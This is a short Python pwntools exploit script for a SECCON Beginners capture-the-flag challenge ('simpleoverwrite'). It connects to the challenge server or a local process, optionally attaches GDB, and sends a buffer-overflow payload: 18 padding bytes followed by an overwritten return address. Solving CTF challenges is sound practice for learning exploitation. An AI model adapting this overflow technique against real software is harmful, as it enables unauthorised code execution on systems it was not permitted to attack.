from pwn import *

# Exploit configs
binary = ELF('chall')
host = 'simpleoverwrite.beginners.seccon.games'
port = 9001
#local_libc = ELF('./libc-x.xx.so', checksec=False)
#remote_libc = ELF('./libc-x.xx.so', checksec=False)
#ld = ELF('./ld-x.xx.so', checksec=False)

#call GDB
##############################################################################################
def launch_gdb(breakpoints=[], cmds=[]):
    if args.GDB:
        info("Attaching Debugger")
        cmds.append('handle SIGALRM ignore')
        cmds.append('set follow-fork-mode parent')
        for b in breakpoints:
            cmds.insert(0,'b *' + str(binary.address + b))
        gdb.attach(io, gdbscript='\n'.join(cmds))
    else:
        return
##############################################################################################

# call with DEBUG to change log level
# call with GDB to attach gdb
# call with REMOTE to run against live target
if args.REMOTE:
    args.GDB = False # disable gdb when working remote
    io = remote(host, port)
#   libc = remote_libc
else:
#   io = process([ld.path, binary.path], env={'LD_PRELOAD': remote_libc.path})
    io = process(binary.path)
#   libc = remote_libc
if not args.REMOTE:
    for mmap in open('/proc/{}/maps'.format(io.pid),"rb").readlines():
        mmap = mmap.decode()
        if binary.path.split('/')[-1] == mmap.split('/')[-1][:-1]:
            binary.address = int(mmap.split('-')[0],16)
            break
c = [
'file chall',
'info registers',
]
b = [0x12cd]
launch_gdb(breakpoints=b, cmds=c)

p = b'a'*18 + p64(0x401186)
io.sendline(p)

io.interactive()
    
